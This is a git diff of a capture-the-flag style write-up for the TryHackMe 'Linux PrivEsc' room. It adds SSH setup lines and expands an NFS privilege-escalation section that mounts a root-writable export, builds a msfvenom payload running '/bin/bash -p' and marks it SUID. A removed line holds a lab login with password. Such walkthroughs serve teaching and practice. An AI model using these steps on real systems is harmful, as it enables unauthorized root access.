@@ -1,11 +1,24 @@
 # Linux PrivEsc
 
-## :desktop: Deploy the Vulnerable Debian VM <a href="#title" id="title"></a>
+{% embed url="https://tryhackme.com/room/linuxprivesc" %}
+https://tryhackme.com/room/linuxprivesc
+{% endembed %}
 
-### &#x20;#2 Run the "id" command. What is the result?
+## Task 1 Deploy the Vulnerable Debian VM <a href="#title" id="title"></a>
+
+#### Deploy the machine and login to the "user" account using SSH.
+
+```bash
+echo 'HostkeyAlgorithms +ssh-rsa' >> .ssh/config
+echo 'PubkeyAcceptedAlgorithms +ssh-rsa' >> .ssh/config
+```
+
+![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-40-03.png>)
+
+#### Run the "id" command. What is the result?
 
 ```
-sshpass -p password321 ssh user@10.10.177.44
+ssh user@10.10.177.44 id
 ```
 
 ![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-34-25.png>)
@@ -108,12 +121,19 @@ LD_LIBRARY_PATH=/tmp ldd /usr/sbin/apache2
 ## :file\_cabinet: NFS
 
 ```
+sudo su -
 mkdir -p /tmp/nfs
-sudo mount 10.10.177.44:/tmp/ /tmp/nfs/
+mount -o rw,vers=3 10.10.192.74:/tmp/ /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +sx /tmp/nfs/shell.elf
 ```
 
 ```
+cat /etc/exports
+/tmp/shell.elf
 ```
+
+![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-54-35.png>) ![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-54-45.png>) ![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-54-55.png>) ![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-55-11.png>)
 
 \#1&#x20;
 
